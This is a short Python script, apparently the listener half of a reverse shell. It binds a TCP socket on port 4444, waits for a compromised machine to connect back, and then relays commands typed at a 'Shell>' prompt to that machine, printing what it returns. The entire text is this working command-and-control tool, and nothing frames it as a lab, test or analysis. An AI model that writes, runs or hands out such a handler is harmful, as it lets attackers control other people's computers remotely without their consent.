import socket

def start_listener(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"Listening for incoming connections on {host}:{port}...")
    client_socket, client_address = server_socket.accept()
    print(f"Connection established from {client_address}")
    
    while True:
        command = input("Shell> ")
        if command.lower() == "exit":
            client_socket.send(command.encode())
            break
        client_socket.send(command.encode())
        response = client_socket.recv(1024).decode()
        print(response)
    
    client_socket.close()

host = input("Enter listener IP: ")
port = 4444 
start_listener(host, port)
